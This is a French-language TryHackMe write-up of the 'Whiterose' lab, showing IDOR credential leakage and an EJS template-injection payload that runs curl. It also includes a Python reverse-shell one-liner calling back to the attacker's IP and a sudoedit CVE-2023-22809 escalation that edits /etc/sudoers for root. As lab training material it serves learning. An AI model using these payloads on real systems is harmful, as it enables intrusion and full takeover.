# Write-up – TryHackMe **Whiterose**

**Nom de la room :** Whiterose  
**Lien :** 
**Niveau :** Facile  
**Description :** Yet another Mr. Robot themed challenge.  

---
<!--
![image](https://github.com/user-attachments/assets/6f175acf-1064-4fba-8dec-4ef9ee972cd2)
-->

Sur le port 80, on a un site web.

Quand on visite la page web on est redirigé vers 'cyprusbank.thm'. On l'ajoute dans le fichier /etc/hosts et on rafraichit la page.
<!--
![image](https://github.com/user-attachments/assets/b5138eab-3ff2-4da3-b4bf-76b9c35f9e3e)
-->

Il est indiqué que le site en maintenance. Je me dis tout de suite qu'il peut y avoir un sous-domaine comme 'dev.cyprusbank.thm' ou autres, sur lequel il y aurait le site en phase de développement (avant mise en production). Avant cela, j'effectue une rapide énumération du site web avec les outils de développemnt du navigateur.

<!--
![image](https://github.com/user-attachments/assets/1df336a4-535e-41b3-9c4f-733efbdde6d1)
-->
Quand on ouvre le site, que 3 ressources sont chargés dont le html de la page d'accueil.

Le html du la page d'accueil ne contient aucun script js, aucune redirection vers une autre page du site web, aucun commentaires. Pas de fichier /robots.txt également.
<!--
![image](https://github.com/user-attachments/assets/f82e91f9-1568-41c0-859c-3abc9e3ffff9)
-->

Le scan rapide d'énumération web avec gobuster ne donne rien..
<!--
![image](https://github.com/user-attachments/assets/f9bfb674-7753-4481-9e4a-d9e9324bebfd)
-->

Je décide donc de chercher s'il y a pas un sous-domain avec un vhost:
<!--
![image](https://github.com/user-attachments/assets/a3968b74-90c4-4fa5-8e24-3e210ca359f4)
-->

On trouve un vhost intéressant : admin. Ajoutons le au /etc/hosts puis rendant nous sur le site admin.cyprusbank.thm.
<!--
![image](https://github.com/user-attachments/assets/b4c265e3-cdf4-499e-95bd-ed4e43cbc23d)
-->

On arrive sur une page de login. Dans l'énoncé du challenge on nous donne les credentials d'un utilisateur : 'Olivia Cortez:olivi8'. On peut mainteannt se connecter sur le site.
<!--
![image](https://github.com/user-attachments/assets/dc8b1a78-cf81-46a8-9a09-a39e165b26e1)
-->

L'utilisateur Olivia Cortez a des droits limités sur le site car on ne peut pas accéder à la page /settings. 
<!--
![image](https://github.com/user-attachments/assets/9ff1c639-4c06-4f7a-a766-c5745ea205c7)
-->

En se rendant sur /messages (http://admin.cyprusbank.thm/messages/?c=5), on peut observer qu'il y a un paramètre 'c' dans l'url. Peut-être qu'on a une IDOR si l'on peut changer la valeur du paramètre et accéder à de nouvelles information?

En mettant la valeur du paramètre c à 20, on peut afficher plus de messages. Cela permet aussi d'obtenir les credentials de l'utilisateur Gayle Bev (Gayle Bev:p~]P@5!6;rs558:q).
<!--
![image](https://github.com/user-attachments/assets/58700f39-3a1c-4d07-a361-1ebd86364d0f)
-->

On peut maintenant se déconnecter et se connecter sur le compte de Gayle Bev. On a maintenantn accès au numéro de téléphone des utilisateurs et à l'endpoint 'settings' :
<!--
![image](https://github.com/user-attachments/assets/f1857f7b-ad49-47a2-935d-9444978db317)
-->

Sur cette endpoint, nous pouvons y définir les mots de passe des clients. En effectuant un test, on remarque que les mots de passe sont affichés. Cela attire immédiatement l'attention sur les vulnérabilités XSS ou SSTI.
<!--
![image](https://github.com/user-attachments/assets/8469acb1-dd86-441b-807c-0183bded15f0)
-->

Avec Burp Suite, j'intercèpte la requête de mise à jour de mot de passe et l'envoie la requête dans le repeater.
<!--
![image](https://github.com/user-attachments/assets/edacb276-9c6d-4cbf-99d3-4f95f873bd86)
-->

Si on modifie la requête en retirant le paramètre password, on obtient un message d'erreur :
<!--
![image](https://github.com/user-attachments/assets/38d92b8e-ac37-4116-876d-28deec32b163)
-->

Voici le message d'erreur :

```
HTTP/1.1 500 Internal Server Error  
Server: nginx/1.14.0 (Ubuntu)  
Date: Sat, 03 Jan 2026 14:06:54 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 1632  
Connection: keep-alive  
X-Powered-By: Express  
Content-Security-Policy: default-src 'none'  
X-Content-Type-Options: nosniff  
```

```text
ReferenceError: /home/web/app/views/settings.ejs:14
  12| <div class="alert alert-info mb-3"><%= message %></div>
  13| <% } %>
>>14| <% if (password != -1) { %>
  15| <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
  16| <% } %>
  17| <% if (typeof error != 'undefined') { %>

password is not defined
  at eval ("/home/web/app/views/settings.ejs":27:8)
  at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
  at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
  at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
  at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
  at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
  at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
  at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
  at /home/web/app/routes/settings.js:27:7
  at runMicrotasks (<anonymous>)
```

L’application a crashé en traitant ta requête. Ici il ne s'agit pas d'un problème réseau ni d’authentification, mais un bug applicatif.  

En analysant les headers, on confirme que l’app utilise :
- Nginx 1.14.0 (reverse proxy)
- Node.js / Express
- Templates EJS
C’est une fuite de stack exploitable pour rechercher des CVE ou cibler des vulnérabilités spécifiques Node / Express / EJS.

L'erreur nous permet de savoir le templates utilisé par EJS (Embedded JavaScript) pour afficher le mot de passe sur la page après update grâce aux balises `<% %>`. Sur internet on trouve facilement de nombreuses ressources sur la faille SSTI avec EJS, dont ces ressources parlant de la CVE-2022-29078 (ejs server side template injection rce) :
- https://github.com/mde/ejs/issues/720
- https://eslam.io/posts/ejs-server-side-template-injection-rce/

<!--
![image](https://github.com/user-attachments/assets/bb87c309-cb66-4ad6-ba3f-4cd645bdcf4e)
-->

<!--
![image](https://github.com/user-attachments/assets/325a006a-abb1-4804-a828-b8b84af44acb)
-->

La payload suivante me permet de m'assurer que la SSTI fonctionne et que l'on peut effectuer une exécution de code à distance (RCE) :
name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 192.168.202.44:8000');s
<!--
![image](https://github.com/user-attachments/assets/033eddbe-4e57-45e2-8ffb-b14d3382cd15)
-->

Ca fonctionne !
<!--
![image](https://github.com/user-attachments/assets/50af5687-c714-4ecb-973d-f3b73c27adeb)
-->

Maintenant, nous pouvons l'utiliser pour obtenir un shell, d'abord en utilisant notre serveur web pour servir une charge utile de shell inversé.

On créer un fichier 'payload.py', et y mets la charge utile :
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.202.44",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
<!--
![image](https://github.com/user-attachments/assets/72ea4b3d-4283-4718-97b2-9e9b80fcabbb)
-->
<!--
![image](https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad)
-->
<!--
![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)
-->

On effectue une shell stabilization :
<!--
![image](https://github.com/user-attachments/assets/ef5be721-2c95-4cc9-89c3-b5b04de621e9)
-->

On trouve le flag user.txt dans le home de l'utilisateur web.
<!--
![image](https://github.com/user-attachments/assets/7fe17284-4f45-4755-9b8a-1ba85dd74e56)
-->

Liste ce que l’utilisateur web peut exécuter avec sudo. On apprend que l’utilisateur web peut modifier un fichier de configuration Nginx en tant que root, sans mot de passe.
<!--
![image](https://github.com/user-attachments/assets/549edde0-3acd-4571-ae35-6f200a31c15f)
-->

En vérifiant la version de sudo, nous voyons qu'il s'agit de la version 1.9.12p1.
<!--
![image](https://github.com/user-attachments/assets/a6e74132-eecb-4d01-bf05-bfaadc59fb39)
-->

En recherchant les vulnérabilités dans la version 1.9.12p1 de sudoedit, nous avons trouvé la vulnérabilité CVE-2023-22809. Vous trouverez des informations détaillées à ce sujet dans cet avis de sécurité publié par Synacktiv (https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf).

Essentiellement, sudoedit permet aux utilisateurs de choisir leur éditeur à l'aide de variables d'environnement telles que SUDO_EDITOR, VISUAL ou EDITOR. Étant donné que les valeurs de ces variables peuvent être non seulement l'éditeur lui-même, mais aussi les arguments à passer à l'éditeur choisi, sudo utilise -- lors de leur analyse pour séparer l'éditeur et ses arguments des fichiers à ouvrir pour modification.

Cela signifie qu'en utilisant l'argument -- dans les variables d'environnement de l'éditeur, nous pouvons le forcer à ouvrir d'autres fichiers que ceux autorisés dans la commande sudoedit que nous pouvons exécuter. Par conséquent, comme nous pouvons exécuter sudoedit en tant que root avec sudo, nous pouvons modifier n'importe quel fichier que nous voulons en tant que root.

Pour utiliser cette vulnérabilité à des fins d'élévation de privilèges, nous pouvons écrire dans de nombreux fichiers. Dans ce cas, nous pouvons simplement choisir d'écrire dans le fichier /etc/sudoers pour nous accorder tous les privilèges sudo.

Nous pouvons exploiter la vulnérabilité comme suit :
web@cyprusbank:~/app$ export EDITOR="nano -- /etc/sudoers"
web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

As we can see, we were able to open the /etc/sudoers file with nano.
<!--
![image](https://github.com/user-attachments/assets/019cf8b5-1406-42cc-bffe-7f7f56a074a0)
-->

Now, by making the addition of web ALL=(ALL) NOPASSWD: ALL to the file, we can grant our current user full sudo privileges.
<!--
![image](https://github.com/user-attachments/assets/36834f4c-cb6c-482a-ab68-5c0862ba3af7)
-->

After saving the file and closing both files, we can see the changes made to our sudo privileges.
<!--
![image](https://github.com/user-attachments/assets/866d94a7-3c15-449f-97c3-66dbcbd26b2a)
-->

Finally, by simply running sudo su -, we can get a shell as the root user and read the root flag at /root/root.txt.
<!--
![image](https://github.com/user-attachments/assets/0eee1307-7369-41f4-a04f-4c64d06162a4)
-->
